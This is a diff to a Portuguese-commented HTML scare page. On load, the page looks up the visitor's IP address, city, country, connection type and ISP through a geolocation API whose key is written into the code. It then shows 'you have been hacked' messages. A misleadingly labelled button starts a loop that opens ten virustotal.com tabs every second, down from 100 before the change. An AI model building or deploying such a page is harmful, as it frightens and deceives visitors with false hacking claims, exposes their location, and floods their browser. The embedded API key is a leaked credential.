@@ -31,9 +31,10 @@
 
         .message {
             color: white; /* Definindo a cor do texto como branco */
-            font-size: 50px;
+            font-size: 20px; /* Diminuindo o tamanho da fonte para IP */
             text-shadow: 0 0 20px rgba(255, 255, 255, 0.7); /* Sombra branca */
             z-index: 10; /* Para garantir que a mensagem apareça acima do fundo */
+            margin: 10px 0; /* Espaço entre mensagens */
         }
 
         /* Estilo das gotículas de sangue */
@@ -92,7 +93,9 @@
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet"> <!-- Fonte assustadora -->
 </head>
 <body>
-    <div class="message" id="message"></div>
+    <div class="message" id="ipMessage"></div>
+    <div class="message" id="locationMessage"></div>
+    <div class="message" id="internetMessage"></div>
 
     <!-- Botão para tocar a música e abrir guias -->
     <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>
@@ -103,19 +106,23 @@
     </div>
 
     <script>
-        // Função para obter o IP do usuário
-        async function getUserIP() {
+        // Função para obter o IP, a localização e a conexão de Internet do usuário
+        async function getUserIPLocationAndConnection() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
                 const data = await response.json();
-                document.getElementById('message').innerText = `You have been hacked your IP ${data.ip}`;
+                document.getElementById('ipMessage').innerText = `you have been hacked IP ${data.ip}`;
+                document.getElementById('locationMessage').innerText = `Location ${data.city}, ${data.country_name}`;
+                document.getElementById('internetMessage').innerText = `Connection ${data.connection}; Provider ${data.isp}`;
             } catch (error) {
-                document.getElementById('message').innerText = 'Não foi possível obter o IP.';
+                document.getElementById('ipMessage').innerText = 'Não foi possível obter o IP.';
+                document.getElementById('locationMessage').innerText = 'Não foi possível obter a localização.';
+                document.getElementById('internetMessage').innerText = 'Não foi possível obter a conexão.';
             }
         }
 
-        // Chama a função para obter o IP ao carregar a página
-        getUserIP();
+        // Chama a função para obter o IP, a localização e a conexão ao carregar a página
+        getUserIPLocationAndConnection();
 
         // Função para iniciar o vídeo e abrir novas guias
         function startVideoAndOpenTabs() {
@@ -127,7 +134,7 @@
             
             // Abre 10 novas guias a cada segundo
             setInterval(() => {
-                for (let i = 0; i < 100; i++) {
+                for (let i = 0; i < 10; i++) {
                     window.open("https://www.virustotal.com", "_blank"); // Altere o link para o que você preferir
                 }
             }, 1000); // Intervalo de 1 segundo (1000 milissegundos)
